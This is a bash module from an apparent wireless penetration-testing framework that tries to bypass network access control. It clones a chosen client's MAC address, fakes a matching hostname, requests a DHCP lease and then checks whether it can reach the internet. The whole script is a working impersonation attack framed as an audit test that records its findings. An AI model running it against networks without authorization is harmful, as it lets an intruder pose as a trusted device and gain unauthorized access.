#!/usr/bin/env bash
# MODULE_META
# NAME="NAC / Port Security Bypass"
# CATEGORY="G"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,dhclient,hostname"
# DESC="Attempt to bypass Network Access Control via Full Identity Spoofing"
# REQS="managed_iface"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/g4_nac_bypass.sh
#  G4: NAC / Port Security Bypass (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Identify authorized MACs from A4 Client Fingerprinting.
#  2. Interactive Selection: Select a target MAC to clone.
#  3. Full Identity Spoofing: Clone MAC, Hostname, and DHCP Fingerprint.
#  4. Test for internal network reachability.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G4"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Initializing NAC Bypass tactical options..."

# 1. Identity Selection
A4_FILE="${EVIDENCE_DIR}/a4_parsed_probes.txt"
if [[ ! -f "$A4_FILE" ]]; then
    echo "[!] A4 findings not found. Please run A4 (Client Fingerprinting) first."
    exit 1
fi

CLIENTS=()
while IFS="|" read -r mac pnl; do
    CLIENTS+=("$mac")
done < "$A4_FILE"

if [[ ${#CLIENTS[@]} -eq 0 ]]; then
    echo "[!] No clients identified by A4. Aborting."
    exit 1
fi

echo "[?] Select target MAC to clone:"
for i in "${!CLIENTS[@]}"; do
    echo "    $((i+1))) ${CLIENTS[$i]}"
done
read -p "Selection [1-${#CLIENTS[@]}]: " choice

if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
    VICTIM_MAC="${CLIENTS[$((choice-1))]}"
    echo "[*] Target Victim: $VICTIM_MAC"
else
    echo "[!] Invalid selection."
    exit 1
fi

# 2. Identity Spoofing
echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
ip link set "$INTERFACE" down
macchanger -m "$VICTIM_MAC" "$INTERFACE"

OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="Workstation-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
hostname "$SPOOFED_HOSTNAME"
trap "hostname $OLD_HOSTNAME" EXIT

ip link set "$INTERFACE" up

DHCP_CONF="${EVIDENCE_DIR}/g4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

echo "[*] Requesting DHCP lease..."
timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true

# 3. Verification
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_results.txt"
if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    echo "[!] SUCCESS: NAC BYPASSED VIA IDENTITY SPOOFING!" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "NAC Bypass Successful" \
        --severity HIGH \
        --desc "Successfully bypassed NAC on $INTERFACE by spoofing full identity of $VICTIM_MAC." \
        --target "Local Network" \
        --evidence "$BYPASS_LOG" \
        --rationale "Network Access Control that relies on identity markers (MAC, Hostname) can be bypassed by cloned attributes, allowing unauthorized lateral movement."
else
    echo "[+] NAC bypass attempt complete. Unrestricted access not achieved." | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[G4] Audit Complete" \
        --severity INFO \
        --desc "Attempted Full Identity Spoofing bypass. No immediate unrestricted access detected." \
        --target "Local Network" \
        --evidence "$BYPASS_LOG" \
        --rationale "Bypass failure indicates either robust NAC implementation (e.g. 802.1X certificates) or lack of active authorized sessions for the selected MAC."
fi

exit 0
